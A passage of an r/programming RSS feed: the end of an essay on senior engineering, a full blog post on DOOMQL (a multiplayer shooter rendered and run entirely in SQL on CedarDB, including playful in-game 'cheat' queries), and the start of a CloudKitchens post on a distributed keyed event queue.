ascending order by creation date. Over time, some clients quietly built logic that relied on that order. When we upgraded the database and optimized the query, the ordering behavior changed, and all tests passed. The next day, we were paged: downstream systems were failing. Nothing was &ldquo;wrong&rdquo; with our code, but clients had built assumptions on API responses that we were unaware of.</p><p>That&rsquo;s the reality of distributed systems: sometimes you&rsquo;re the one breaking a dependency, and sometimes you&rsquo;re the one depending on an unstated behavior. Both roles carry risk. Senior engineers anticipate this by communicating guarantees clearly, versioning APIs carefully, and setting up monitoring that catches unexpected shifts in behavior. Tests are valuable, but they&rsquo;re not a shield. <strong>Given enough time, enough traffic, and enough change, every system will break. The question isn&rsquo;t <em>if</em> &mdash; it&rsquo;s <em>when</em>, and how prepared you are to respond.</strong></p><h2>Embrace Change and Adapt</h2><p>The longer you spend in this industry, the clearer it becomes that change is constant, and the pace is only accelerating. In today&rsquo;s world, LLMs have already become part of everyday workflows. They are used to summarize information, answer questions, and assist with routine tasks (including coding).<strong> Is there hype surrounding them? For sure, yes. But it would be a mistake to assume they will simply fade away and leave us with the old ways of working.</strong> These tools will continue to improve and gradually take on more responsibilities.</p><p>Unlike the other lessons I&rsquo;ve shared here, this one doesn&rsquo;t come with a classic story or decades of battle-tested examples. We&rsquo;re still at the very beginning of figuring out the long-term impact of LLMs, which means the patterns aren&rsquo;t fully written yet. What I can say is that I&rsquo;ve already seen them provide small but meaningful gains; generating service status reports, scanning through logs to link metrics to incidents, writing code/tests (always peer-reviewed), and even highlighting potential security concerns during code reviews. They&rsquo;re not a replacement for engineering judgment, but when used thoughtfully, they can speed things up.</p><p><strong>That is why embracing change here doesn&rsquo;t mean blindly trusting AI-generated code, nor assuming it solves every problem. It means staying informed, experimenting carefully, and integrating what genuinely adds value while being mindful of risks like reliability, bias, or over-reliance. Engineers who learn to collaborate effectively with LLMs will free themselves to focus on higher-level problems, and in my opinion, they&rsquo;ll be better prepared for whatever role this technology grows into next.</strong></p></div><div><h2>Closing Notes</h2><p>At the end of the day, becoming a senior software engineer isn&rsquo;t about memorizing every algorithm, mastering every framework, or pretending to have all the answers. It&rsquo;s about judgment, humility, and the ability to adapt when things don&rsquo;t go as planned. It&rsquo;s about pausing to ask <em>why</em>, verifying instead of assuming, and putting guardrails in place so the team doesn&rsquo;t have to rely on memory or luck. Most of all, it&rsquo;s about becoming someone others can trust &mdash; when systems fail, when trade-offs get messy, or simply when people need guidance.</p><p>None of us get there without mistakes. I certainly didn&rsquo;t. What matters is what you learn from those moments, and how you pass that knowledge on to others. <strong>In the long run, your real job is to grow people who can one day take your place</strong>. That&rsquo;s what leadership looks like. If there&rsquo;s one message I hope you take from this article, it&rsquo;s that seniority is not a title &mdash; it&rsquo;s a mindset. And it&rsquo;s built slowly, day by day, decision by decision.</p><p><strong><em>Disclaimer</em></strong><em>: The content of this article is based on my personal experiences and reflections. It should not be interpreted as representing the views of my current employer or any other organization I have worked for.</em></p></div><div class="gallery"><p><img src="https://miro.medium.com/v2/resize:fill:64:64/1*vwObCqzIwzvIzAHchI0eIA@2x.jpeg"></p></div></section>]]></description><pubDate>Wed, 10 Sep 2025 04:02:25 +0530</pubDate></item><item><link>https://cedardb.com/blog/doomql/</link><title>Building a DOOM-like multiplayer shooter in pure SQL (cedardb.com)</title><guid isPermaLink="true">https://www.reddit.com/r/programming/comments/1ncoxl8/building_a_doomlike_multiplayer_shooter_in_pure/</guid><comments>https://www.reddit.com/r/programming/comments/1ncoxl8/building_a_doomlike_multiplayer_shooter_in_pure/</comments><description><![CDATA[<section class='reading-time-and-permalink'><p>Reading time: 30 min | <a href='https://www.reddit.com/r/programming/comments/1ncoxl8/building_a_doomlike_multiplayer_shooter_in_pure/'>Post permalink</a></p></section><section class='separator separator-before-parsed-content'><p>&nbsp;</p><hr><p>&nbsp;</p></section><section class='parsed-content'><section><header><p><span>September 8, 2025</span> <span>&bull;</span> <span>12 minutes</span></p></header><div><figure><img src="https://cedardb.com/img/team/vogel.jpg" alt="Lukas Vogel"></figure><p>Lukas Vogel</p></div></section><section><h2>DOOMQL: A DOOM-like multiplayer shooter in pure SQL</h2><section><p>I recently stumbled across Patrick&rsquo;s excellent <a href="https://www.hey.earth/posts/duckdb-doom">DOOM clone</a> running in a browser powered by DuckDB-WASM. Ever since I&rsquo;ve read that, I wanted to push his awesome idea to the logical extreme: Build a <strong>multiplayer</strong> DOOM-like shooter <strong>entirely</strong> in SQL with CedarDB doing all the heavy lifting. During a month of parental leave (i.e., a lot of sleepless nights), I tried exactly that.</p><p>Here&rsquo;s a sneak peek at DOOMQL:</p><video> <source src="https://cedardb.comdoomql.mp4">Your browser does not support the video tag.</source></video><p>DOOMQL in action</p><p>Okay, with the flashy demo out of the way, let&rsquo;s talk about details. What follows is a tour of the architecture, the SQL rendering pipeline, the game loop, and the fun metagame of cheating by issuing SQL commands against the database.</p></section><h2>Why even do this?</h2><section>Playing DuckDB DOOM in your browser is fun, but some things bugged me: First of all, having parts of the rendering pipeline in Javascript felt like cheating. It worked well for DuckDB-Doom where everything is contained in a single HTML page, but I wanted to see if I could do everything in SQL. DuckDB-Doom is also a little bit stuttery with just 8 frames per second and has a pretty tiny viewport. I wanted to see if I could speed that up by switching over to CedarDB. I also wanted real sprites with transparency and they should move around believably in 3D space. And most importantly, making the game multi-player should not just be possible, but easy, right? I got nerd-sniped by the perceived similarity of a database server to a traditional game server: <strong>Databases exist to synchronize shared state across clients.</strong> Thanks to transaction isolation, each player has a consistent view of the game world, no matter what the other clients are doing. Why not lean into that? I would love to lie to you and claim I did it all to push CedarDB as an awesome database system but to be honest the database nerd in me just wanted to turn all knobs up to 11 and see what breaks.</section><h2>Architectural overview</h2><section><p>At a high level</p><ul><li>State lives in tables (map, players, mobs, inputs, configs, sprites, &hellip;)</li><li>Rendering is a stack of SQL views that implement raycasting and sprite projection</li><li>The game loop is a tiny shell script that executes a SQL file ~ 30 times per second.</li><li>The client is ~ 150 lines of Python: It polls for input and queries the database for your 3D view.</li></ul><p>You can play, observe other players and even cheat (by sending raw SQL).</p></section><h2>Game state, or: Let&rsquo;s store everything in the database</h2><section><p>With a database at hand, it&rsquo;s natural to store all game configuration, state, and static data in the database:</p><p><strong>Config</strong>:</p><div><pre><code><span><span><span>CREATE</span><span>TABLE</span>config(<span> </span></span></span><span><span>player_move_speed<span> </span><span>NUMERIC</span><span>DEFAULT</span><span>0</span>.<span>3</span>,</span></span><span><span>player_turn_speed<span> </span><span>NUMERIC</span><span>DEFAULT</span><span>0</span>.<span>2</span>,</span></span><span><span>ammo_max<span> </span><span>INT</span><span>DEFAULT</span><span>10</span>,</span></span><span><span>ammo_refill_interval_seconds<span> </span><span>INT</span><span>DEFAULT</span><span>2</span></span></span><span><span>);<span> </span></span></span></code></pre></div><p><strong>Map</strong>:</p><div><pre><code><span><span><span>CREATE</span><span>TABLE</span><span>map</span>(x<span>INT</span>,y<span> </span><span>INT</span>,tile<span> </span><span>CHAR</span>);</span></span></code></pre></div><p><strong>Players and inputs</strong>:</p><div><pre><code><span><span><span>CREATE</span><span>TABLE</span>players<span> </span>(</span></span><span><span>id<span> </span><span>INT</span><span>REFERENCES</span>mobs(id),<span> </span></span></span><span><span>score<span> </span><span>INT</span><span>DEFAULT</span><span>0</span>,</span></span><span><span>hp<span> </span><span>INT</span><span>DEFAULT</span><span>100</span>,</span></span><span><span>ammo<span> </span><span>INT</span><span>DEFAULT</span><span>10</span>,</span></span><span><span>last_ammo_refill<span> </span><span>int</span><span>default</span><span>EXTRACT</span>(EPOCH<span>FROM</span>(now()))::<span>INT</span></span></span><span><span>);<span> </span></span></span><span><span><span>CREATE</span><span>TABLE</span>inputs(<span> </span></span></span><span><span>player_id<span> </span><span>INT</span><span>PRIMARY</span><span>KEY</span><span>REFERENCES</span>players(id),<span> </span></span></span><span><span>action<span> </span><span>CHAR</span>(<span>1</span>),<span>-- 'w', 'a', 's', 'd', 'x' for shooting </span></span></span><span><span><span> </span><span>timestamp</span><span>TIMESTAMP</span><span>DEFAULT</span>NOW()<span> </span></span></span><span><span>);<span> </span></span></span></code></pre></div><p>Because everything is data, modding a running match is trivial:</p><div><pre><code><span><span><span>-- Change a setting </span></span></span><span><span><span>update</span>config<span> </span><span>set</span>ammo_max<span> </span><span>=</span><span>20</span>;</span></span><span></span><span><span><span>-- Add a player </span></span></span><span><span><span>insert</span><span>into</span>players<span> </span><span>values</span>(...);<span> </span></span></span><span><span><span>-- Move forward </span></span></span><span><span><span>update</span><span>input</span><span>set</span>action<span> </span><span>=</span><span>'w'</span><span>where</span>player_id<span> </span><span>=</span><span>&lt;</span>your_id<span>&gt;</span>;</span></span><span></span><span><span><span>-- Cheat (pls be smarter about it) </span></span></span><span><span><span>update</span>players<span> </span><span>set</span>hp<span> </span><span>=</span><span>100000</span><span>where</span>player_id<span> </span><span>=</span><span>&lt;</span>your_id<span>&gt;</span>;</span></span><span></span><span><span><span>-- Ban cheaters (that weren't smart about it) </span></span></span><span><span><span>delete</span><span>from</span>players<span> </span><span>where</span>hp<span> </span><span>&gt;</span><span>100</span>;</span></span></code></pre></div></section><h2>Renderer: When a <code>VIEW</code> becomes your 3D view</h2><section><p>If you squint enough, in DOOM, a 3D (or more correct: 2.5D) view is just a <em>view over 2D state</em> (i.e., the level map and any players/enemies on it). Well, we&rsquo;ve got <code>VIEWS</code> in SQL as well. They&rsquo;re also just views on our (2D) state tables. What&rsquo;s stopping us from quite <em>literally</em> building a 3D &ldquo;view&rdquo; of our 2D map using a simple raycasting algorithm?</p><p>The pipeline:</p><ol><li>Send a set of rays from each player&rsquo;s eye into the world, and see which map tiles are visible</li><li>Check which walls the player sees, rendering them at the correct height and more or less solid based on the distance</li><li>Project mobs into the player&rsquo;s camera space</li><li>Select sprite LODs based on depth</li><li>Expand sprites into pixels, scaled to screen space</li><li>Occlude against walls and other sprites</li><li>Assemble frame buffer rows with <code>string_agg</code></li><li>Build a minimap reusing the visible tiles calculation from earlier</li><li>Combine the 3D view with minimap and HUD (HP/bullets/players) into a game view</li></ol><p>Let&rsquo;s take a more in-depth look at steps 2, 7, and 8.</p></section><h3>Raycasting</h3><section><p>The recursive ray&#8209;marching logic is adapted from <a href="https://www.hey.earth/posts/duckdb-doom">Patrick&rsquo;s DuckDB DOOM post</a>. Here is a simplified excerpt, adapted for multiplayer:</p><div><pre><code><span><span><span>CREATE</span><span>OR</span><span>REPLACE</span><span>VIEW</span>visible_tiles<span> </span><span>AS</span></span></span><span><span><span>WITH</span><span>RECURSIVE</span>raytrace<span> </span><span>AS</span>(<span> </span></span></span><span><span><span>-- Starting at the player's eye ... </span></span></span><span><span><span> </span><span>SELECT</span>r.player_id,<span> </span>r.col,<span>1</span><span>AS</span>step_count,<span> </span></span></span><span><span>r.player_x<span> </span><span>+</span>COS(r.angle)<span>*</span>s.step<span>AS</span>fx,<span> </span></span></span><span><span>r.player_y<span> </span><span>+</span>SIN(r.angle)<span>*</span>s.step<span>AS</span>fy,<span> </span></span></span><span><span>r.angle,<span> </span><span> </span><span>AS</span>dist<span> </span></span></span><span><span><span>FROM</span>rays<span> </span>r,settings<span> </span>s<span>-- rays are built in an earlier step </span></span></span><span><span><span> </span><span>UNION</span><span>ALL</span></span></span><span><span><span>-- ... we recursively march along the rays, 1 "step" at a time ... </span></span></span><span><span><span> </span><span>SELECT</span>rt.player_id,<span> </span>rt.col,rt.step_count<span> </span><span>+</span><span>1</span>,</span></span><span><span>rt.fx<span> </span><span>+</span>COS(rt.angle)<span>*</span>s.step,</span></span><span><span>rt.fy<span> </span><span>+</span>SIN(rt.angle)<span>*</span>s.step,</span></span><span><span>rt.angle,<span> </span></span></span><span><span>step_count<span> </span><span>*</span>s.step<span> </span><span>*</span>COS(rt.angle<span> </span><span>-</span>m.dir)<span> </span><span>AS</span>dist<span> </span></span></span><span><span><span>FROM</span>raytrace<span> </span>rt,settings<span> </span>s,players<span> </span>p,mobs<span> </span>m</span></span><span><span><span>WHERE</span>rt.step_count<span> </span><span>&lt;</span>s.max_steps<span> </span><span>-- ... stopping after our max render distance </span></span></span><span><span><span> </span><span>AND</span>rt.player_id<span> </span><span>=</span>p.id<span> </span></span></span><span><span><span>AND</span>m.id<span> </span><span>=</span>p.id<span> </span></span></span><span><span><span>AND</span><span>NOT</span><span>EXISTS</span>(<span> </span><span>-- or if we hit a wall </span></span></span><span><span><span> </span><span>SELECT</span><span>1</span><span>FROM</span><span>map</span>m<span> </span></span></span><span><span><span>WHERE</span>m.x<span> </span><span>=</span><span>CAST</span>(rt.fx<span>AS</span><span>INT</span>)<span>AND</span>m.y<span> </span><span>=</span><span>CAST</span>(rt.fy<span>AS</span><span>INT</span>)</span></span><span><span><span>AND</span>m.tile<span> </span><span>=</span><span>'#'</span>)<span>-- wall </span></span></span><span><span>)<span> </span></span></span><span><span><span>-- We then determine per player: </span></span></span><span><span><span>-- a) which tiles we hit </span></span></span><span><span><span>-- b) how far away these tiles are </span></span></span><span><span><span>-- c) the column of the screen each tile should correspond to </span></span></span><span><span><span>SELECT</span>player_id,<span> </span>tile,<span>CAST</span>(fx<span>AS</span><span>INT</span>)<span>AS</span>tile_x,<span> </span><span>CAST</span>(fy<span>AS</span><span>INT</span>)<span>AS</span>tile_y,<span> </span>col,<span>MIN</span>(dist)<span>AS</span>dist<span> </span></span></span><span><span><span>FROM</span>raytrace<span> </span>rt,<span>map</span>m<span> </span></span></span><span><span><span>WHERE</span>m.x<span> </span><span>=</span><span>CAST</span>(rt.fx<span>AS</span><span>INT</span>)<span>AND</span>m.y<span> </span><span>=</span><span>CAST</span>(rt.fy<span>AS</span><span>INT</span>)<span>-- We might hit the same tile multiple times, so we take the closest hit </span></span></span><span><span><span>GROUP</span><span>BY</span>player_id,<span> </span>tile_x,tile_y,<span> </span>tile,col;<span> </span></span></span></code></pre></div><p>And that&rsquo;s just the <em>first</em> step in the pipeline. For the rest, take a look at <a href="https://github.com/cedardb/DOOMQL/blob/main/renderer.sql">the code</a>.</p></section><h3>Final frame assembly</h3><section><p>After all the heavy lifting, the payoff is surprisingly simple:</p><div><pre><code><span><span><span>SELECT</span>player_id,<span> </span>y,string_agg(ch,<span> </span><span>''</span><span>ORDER</span><span>BY</span>x)<span> </span><span>AS</span><span>row</span></span></span><span><span><span>FROM</span>framebuffer<span> </span></span></span><span><span><span>GROUP</span><span>BY</span>player_id,<span> </span>y;</span></span></code></pre></div><p>This glues together character pixels into text rows.</p></section><h3>HUD + minimap</h3><section><p>The same trick builds the HUD and minimap. Here is the health bar:</p><div><pre><code><span><span><span>'HP: ['</span><span>||</span></span></span><span><span>repeat(<span>'&#9608;'</span>,LEAST(<span>20</span>,ROUND(<span>20</span><span>*</span>GREATEST(<span>0</span>,LEAST(p.hp,<span>100</span>))::<span>numeric</span><span>/</span><span>100</span>)::<span>int</span>))<span>||</span></span></span><span><span>repeat(<span>' '</span>,GREATEST(<span>0</span>,<span>20</span><span>-</span>ROUND(<span>20</span><span>*</span>GREATEST(<span>0</span>,LEAST(p.hp,<span>100</span>))::<span>numeric</span><span>/</span><span>100</span>)::<span>int</span>))<span>||</span></span></span><span><span><span>'] '</span><span>||</span>GREATEST(<span>0</span>,p.hp)<span> </span></span></span></code></pre></div><p>Add ammo dots with <code>repeat('&bull;', p.ammo)</code> and you&rsquo;ve got a HUD entirely in SQL:</p><pre><code> 1: Lukas (L) score: 1 HP: [&#9608;&#9608;&#9608;&#9608;&#9608;&#9608;&#9608;&#9608;&#9608; ] 50 AMMO: &bull;&bull;&bull;&bull;&bull;&bull;&bull;&bull;&bull;&bull; 2: Foobar (F) score: 0 HP: [&#9608;&#9608;&#9608;&#9608;&#9608;&#9608;&#9608;&#9608;&#9608;&#9608;&#9608;&#9608;&#9608;&#9608;&#9608;&#9608;&#9608;&#9608;&#9608;&#9608;] 100 AMMO: &bull;&bull;&bull;&bull;&bull;&bull;&bull;&bull; </code></pre><p>We can also re-use our earlier <code>visible_tiles</code> view to build a minimap with a view cone:</p><pre><code>select * from minimap where player_id = 1 order by y; player_id | y | row -----------+----+------------------------------------------------------------------ 1 | 0 | ################################################################ 1 | 1 | ################################################################ 1 | 2 | ##....... ##### ############################# 1 | 3 | ##.....F. ##### ##### ### 1 | 4 | ##....... ##### ##### ### 1 | 5 | ## ..... ##### ##### ### 1 | 6 | ## ... ### 1 | 7 | ## .L ### 1 | 8 | ## ##### ##### ### 1 | 9 | ## ##### ##### ### 1 | 10 | ## ############# ########## ### 1 | 11 | ########## ################ ########## ### 1 | 12 | ########## ################ ########## ### 1 | 13 | ########## ################ ###################### ########## 1 | 14 | #### ####### ###################### ########## 1 | 15 | #### ####### ###################### ########## 1 | 16 | #### ##### ##### ### 1 | 17 | #### ##### ##### ### 1 | 18 | #### ##### ##### ### 1 | 19 | #### ##### ##### ### 1 | 20 | #### ##### ##### ### 1 | 21 | #### ##### ### 1 | 22 | #### ### 1 | 23 | #### ##### ### 1 | 24 | #### ##### ##### ### 1 | 25 | #### ##### ##### ### 1 | 26 | #### ##### ##### ### 1 | 27 | #### ##### ##### ### 1 | 28 | #### ##### ##### ### 1 | 29 | ################################################################ 1 | 30 | ################################################################ 1 | 31 | ################################################################ </code></pre></section><h2>The surprisingly elegant game loop</h2><section><p>The loop is just a shell script running raw SQL against the database:</p><div><pre><code><span><span><span># Game loop @ 30 ticks per second</span> </span></span><span><span><span>while</span> true; <span>do</span> </span></span><span><span> psql -qtAX -U <span>"</span><span>$DB_USER</span><span>"</span> -d <span>"</span><span>$DB_NAME</span><span>"</span> -h <span>"</span><span>$DB_HOST</span><span>"</span> -p <span>"</span><span>$DB_PORT</span><span>"</span> -f gameloop.sql </span></span><span><span> sleep 0.03 </span></span><span><span><span>done</span> </span></span></code></pre></div><p>Inside <code>gameloop.sql</code>, actions like bullet movement, collisions, kills, and respawns run in a single transaction, which keeps state consistent even if something fails mid-tick.</p><p>Here&rsquo;s the part processing interactions with bullets:</p><div><pre><code><span><span><span>-- Process all bullets </span></span></span><span><span><span>BEGIN</span><span>TRANSACTION</span>;</span></span><span></span><span><span><span>-- Move bullets forward </span></span></span><span><span><span>UPDATE</span>mobs<span> </span></span></span><span><span><span>SET</span>x<span> </span><span>=</span>x<span> </span><span>+</span>cos(dir)<span> </span><span>*</span><span>0</span>.<span>5</span>,y<span> </span><span>=</span>y<span> </span><span>+</span>sin(dir)<span> </span><span>*</span><span>0</span>.<span>5</span></span></span><span><span><span>WHERE</span>kind<span> </span><span>=</span><span>'bullet'</span>;</span></span><span></span><span><span><span>-- Delete bullets that are out of bounds </span></span></span><span><span><span>DELETE</span><span>FROM</span>mobs<span> </span></span></span><span><span><span>WHERE</span>(x<span> </span><span>&lt;</span><span>0</span></span></span><span><span><span>OR</span>x<span> </span><span>&gt;=</span>(<span>select</span><span>max</span>(x)<span>from</span><span>map</span>)</span></span><span><span><span>OR</span>y<span> </span><span>&lt;</span><span>0</span></span></span><span><span><span>OR</span>y<span> </span><span>&gt;=</span>(<span>select</span><span>max</span>(y)<span>from</span><span>map</span>))</span></span><span><span><span>AND</span>kind<span> </span><span>=</span><span>'bullet'</span>;</span></span><span></span><span><span><span>-- Delete bullets that hit walls </span></span></span><span><span><span>DELETE</span><span>FROM</span>mobs<span> </span>b</span></span><span><span><span>WHERE</span><span>EXISTS</span></span></span><span><span>(<span>SELECT</span><span>1</span></span></span><span><span><span>FROM</span><span>map</span>m<span> </span></span></span><span><span><span>WHERE</span>m.x<span> </span><span>=</span><span>CAST</span>(b.x<span>AS</span><span>INT</span>)</span></span><span><span><span>AND</span>m.y<span> </span><span>=</span><span>CAST</span>(b.y<span>AS</span><span>INT</span>)</span></span><span><span><span>AND</span>m.tile<span> </span><span>=</span><span>'#'</span>)</span></span><span><span><span>AND</span>kind<span> </span><span>=</span><span>'bullet'</span>;</span></span><span></span><span></span><span><span><span>-- Players hit by a bullet loses 50 HP </span></span></span><span><span><span>UPDATE</span>players<span> </span>p<span>SET</span>hp<span> </span><span>=</span>hp<span> </span><span>-</span><span>50</span></span></span><span><span><span>FROM</span>collisions<span> </span><span>c</span></span></span><span><span><span>WHERE</span>p.id<span> </span><span>=</span><span>c</span>.player_id;</span></span><span></span><span><span><span>-- If a player has 0 or less HP, the player killing them gets a point </span></span></span><span><span><span>UPDATE</span>players<span> </span>p<span>SET</span>score<span> </span><span>=</span>score<span> </span><span>+</span><span>1</span></span></span><span><span><span>FROM</span>collisions<span> </span><span>c</span></span></span><span><span><span>WHERE</span>p.id<span> </span><span>=</span><span>c</span>.bullet_owner</span></span><span><span><span>AND</span><span>EXISTS</span>(<span>SELECT</span><span>1</span><span>FROM</span>players<span> </span>p2<span>WHERE</span>p2.id<span> </span><span>=</span><span>c</span>.player_id<span>AND</span>p2.hp<span> </span><span>&lt;=</span><span>0</span>);</span></span><span></span><span><span><span>-- Delete bullets that hit players </span></span></span><span><span><span>DELETE</span><span>FROM</span>mobs<span> </span>m</span></span><span><span><span>USING</span>collisions<span> </span><span>c</span></span></span><span><span><span>WHERE</span>m.id<span> </span><span>=</span><span>c</span>.bullet_id;</span></span><span></span><span><span><span>-- Respawn players whose HP is 0 or less </span></span></span><span><span><span>UPDATE</span>mobs<span> </span>m</span></span><span><span><span>SET</span>x<span> </span><span>=</span>r.x,<span> </span>y<span>=</span>r.y,<span> </span>dir<span>=</span><span>0</span></span></span><span><span><span>FROM</span>players<span> </span>p</span></span><span><span><span>CROSS</span><span>JOIN</span>(<span> </span></span></span><span><span><span>SELECT</span>x,<span> </span>y</span></span><span><span><span>FROM</span><span>map</span></span></span><span><span><span>WHERE</span>tile<span> </span><span>=</span><span>'R'</span></span></span><span><span><span>ORDER</span><span>BY</span>random()<span> </span></span></span><span><span><span>LIMIT</span><span>1</span></span></span><span><span>)<span> </span><span>AS</span>r<span> </span></span></span><span><span><span>WHERE</span>m.id<span> </span><span>=</span>p.id<span> </span></span></span><span><span><span>AND</span>p.hp<span> </span><span>&lt;=</span><span>0</span>;</span></span><span></span><span><span><span>-- Reset players' HP to 100 and ammo to 10 after respawn </span></span></span><span><span><span>UPDATE</span>players<span> </span>p<span>SET</span></span></span><span><span>hp<span> </span><span>=</span><span>100</span>,</span></span><span><span>ammo<span> </span><span>=</span><span>10</span></span></span><span><span><span>FROM</span>mobs<span> </span>m</span></span><span><span><span>WHERE</span>p.id<span> </span><span>=</span>m.id<span> </span></span></span><span><span><span>AND</span>p.hp<span> </span><span>&lt;=</span><span>0</span>;</span></span><span></span><span><span><span>COMMIT</span>;</span></span></code></pre></div><p>On my machine, the game loop takes about 1 ms, so we could defintely improve the tick rate. That might be a way to get the Counterstrike snobs who scoff at everything below 128 Hz. It would require some refactoring on my part since I tied the movement speed to the game loop - a big no no in game design!</p><p>While only someone insane could think a pure SQL raycasting renderer is a good idea in an actual game, I&rsquo;ll happily defend this transactional game loop. I don&rsquo;t think this part would be much more concise or less brittle in a real game engine.</p></section><h2>Make it multiplayer in two queries</h2><section><p>The game client&rsquo;s job description is simple:</p><ol><li>Render</li></ol><div><pre><code><span><span><span>SELECT</span>full_row<span> </span><span>FROM</span>screen<span> </span><span>WHERE</span>player_id<span> </span><span>=</span><span>&lt;</span>your_id<span>&gt;</span><span>ORDER</span><span>BY</span>y<span> </span></span></span></code></pre></div><ol><li>Send input</li></ol><div><pre><code><span><span><span>INSERT</span><span>INTO</span>inputs(player_id,<span> </span>action)</span></span><span><span><span>VALUES</span>(<span>&lt;</span>your_id<span>&gt;</span>,<span>&lt;</span>pressed_key<span>&gt;</span>)</span></span><span><span><span>ON</span>CONFLICT(player_id)<span> </span></span></span><span><span><span>DO</span><span>UPDATE</span><span>SET</span>action<span> </span><span>=</span>EXCLUDED.action<span> </span></span></span></code></pre></div><p>The game loop periodically checks the input table and moves all players accordingly - inside a transaction, of course, so we don&rsquo;t run into any race conditions.</p><p>That&rsquo;s it (well, plus a one-time &ldquo;create player&rdquo; on first connect). The ~150 lines of Python in the client mostly handle keyboard input and reducing terminal flicker. Bonus: The client provides an observer mode. All it has to do is swap the <code><player_id></player_id></code> in the render call.</p></section><h2>Performance</h2><section><p>At 128 x 64 pixels, a single player view takes ~33 ms on my machine, which is <strong>enough for a breezy ~30 FPS</strong>, compared to DuckDB DOOM&rsquo;s 8 FPS at just 32 x 16 pixels. I&rsquo;m actually quite proud of that performance and quite happy with CedarDB here. I don&rsquo;t think any other database system can keep up with that. Let me know if you find one!</p><p>You might worry that rendering the views of all players and filtering late would be very wasteful. CedarDB&rsquo;s query optimizer pushes the <code>where player_id = &lt;...&gt;</code> predicate through view boundaries, avoiding unncessary work. You can easily check by running:</p><div><pre><code><span><span><span>select</span><span>*</span><span>from</span>screen<span> </span><span>order</span><span>by</span>y;<span> </span><span>-- render both users </span></span></span><span><span><span>-- Time: 57,907 ms (~2x single player 33ms) </span></span></span></code></pre></div></section><section><p>Because clients send raw SQL as superusers (I didn&rsquo;t bother setting up any role based access control or row level security, don&rsquo;t do that!), there&rsquo;s an <strong>emergent metagame: Cheat creatively and try not to get caught</strong>.</p><p>Low effort:</p><div><pre><code><span><span><span>update</span>players<span> </span><span>set</span>score<span> </span><span>=</span><span>0</span><span>where</span>id<span> </span><span>!=</span><span>&lt;</span>your_id<span>&gt;</span>;</span></span><span><span><span>update</span>players<span> </span><span>set</span>hp<span> </span><span>=</span><span>0</span><span>where</span>id<span> </span><span>!=</span><span>&lt;</span>your_id<span>&gt;</span>;</span></span></code></pre></div><p>Mischievous:</p><div><pre><code><span><span><span>update</span>inputs<span> </span><span>set</span>action<span> </span><span>=</span><span>null</span><span>where</span>player_id<span> </span><span>!=</span><span>&lt;</span>your_id<span>&gt;</span>;</span></span></code></pre></div><p>Steal kills:</p><div><pre><code><span><span><span>update</span>mobs<span> </span><span>set</span><span>owner</span><span>=</span><span>&lt;</span>your_id<span>&gt;</span><span>where</span>kind<span> </span><span>=</span><span>'bullet'</span>;</span></span></code></pre></div><p>Attempted but didn&rsquo;t work:</p><div><pre><code><span><span><span>DELETE</span><span>FROM</span>mobs<span> </span>m</span></span><span><span><span>USING</span>collisions<span> </span><span>c</span></span></span><span><span><span>WHERE</span>m.id<span> </span><span>=</span><span>c</span>.bullet_id<span>AND</span><span>c</span>.player_id<span>=</span><span>&lt;</span>your_id<span>&gt;</span>;</span></span></code></pre></div><p>This doesn&rsquo;t work because moving bullets, checking for collisions, and respawn happens in the same transaction. As transactions are atomic, you either see everything being applied at once, or nothing. By the time you see the hit, you&rsquo;re already dead. A property that&rsquo;s very useful for database systems (and not just to prevent cheating).</p></section><h2>What I learned</h2><section><p>I set out to see if I could push Patrick&rsquo;s demo to an extreme: Doing the entire rendering pipeline in SQL. And while it works, I have to admit that it is a pretty&hellip; bad idea? Fast enough, but horrible to maintain and debug.</p><p>The surprise was how <em>natural</em> it felt to express game state and logic in SQL. It even felt like accidentally re-invented the <a href="https://en.wikipedia.org/wiki/Entity_component_system">entity-component-system</a> pattern.<br>And multiplayer &ldquo;just worked&rdquo; because the database system which handles all the nasty concurrency is the source of truth.</p></section><h2>Try it yourself!</h2><section><p>All the code is on Github: <a href="https://github.com/cedardb/DOOMQL">DOOMQL Repo</a></p><p>Run:</p><div><pre><code><span><span>docker pull cedardb/cedardb:latest </span></span><span><span>docker run --rm -p 5432:5432 -e <span>CEDAR_PASSWORD</span><span>=</span>postgres --detach cedardb/cedardb:latest </span></span><span><span><span># Wait a few seconds for CedarDB to start</span> </span></span><span><span>./server.sh </span></span><span><span><span># in a second terminal window, zoom way out to have no line wraping issues</span> </span></span><span><span>python3 pyclient.py </span></span></code></pre></div><p>Want to discuss DOOMQL with me or find like-minded database nerds? <a href="https://bonsai.cedardb.com/slack">Join our Community Slack</a></p></section></section> </section>]]></description><pubDate>Tue, 09 Sep 2025 22:47:39 +0530</pubDate></item><item><link>https://techblog.cloudkitchens.com/p/reliable-order-processing</link><title>Does the world need another distributed queue? (techblog.cloudkitchens.com)</title><guid isPermaLink="true">https://www.reddit.com/r/programming/comments/1ncnrfs/does_the_world_need_another_distributed_queue/</guid><comments>https://www.reddit.com/r/programming/comments/1ncnrfs/does_the_world_need_another_distributed_queue/</comments><description><![CDATA[<section class='reading-time-and-permalink'><p>Reading time: 26 min | <a href='https://www.reddit.com/r/programming/comments/1ncnrfs/does_the_world_need_another_distributed_queue/'>Post permalink</a></p></section><section class='separator separator-after-permalink'><p>&nbsp;</p><hr><p>&nbsp;</p></section><section class='selftext'><!-- SC_OFF --><div class="md"><p>I saw a post here recently talking about building a distributed queue. We built our own at Cloudkitchens, it is based on an in-house built sharder and CRDB. It also features a neat solution to head-of-the-line blocking by keeping track of consumption per key, which we call the Keyed Event Queue, or KEQ. Think it is like Kafka, with pretty much unlimited number of partitions. We have been running it in production for mission-critical workloads for almost five years, so it is reasonably battle-proven. </p><p>It makes development of event-driven systems that require a true Active-Active multiregional topology relatively easy, and I can see how it can evolve to be even more reliable and cost efficient. </p><p>We talked internally about open-sourcing it, but as it is coupled with our internal libraries, it will require some work to get done. Do you think anyone outside will benefit/use a system like that? The team would love your feedback. </p></div><!-- SC_ON --></section><section class='preview-image'><p>&nbsp;</p><img src='https://substackcdn.com/image/fetch/$s_!CEif!,w_1200,h_600,c_fill,f_jpg,q_auto:good,fl_progressive:steep,g_auto/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F56c3cbf7-ac4a-4def-9492-7126dda97c78_900x599.png' /></section><section class='parsed-content'><div><article><div><p><em>Written by Henning Rohde and Jordan Hurwitz, members of the engineering teams that work on infrastructure.</em></p><p>At CloudKitchens, real-time food order fulfillment is at the heart of our business. When a customer places an order, an elaborate orchestration workflow is run behind the scenes to ensure the meal is cooked, assembled, and delivered efficiently and seamlessly.</p><p><span>What needs to happen &ndash; and when &ndash; depends on the specifics of the order and is 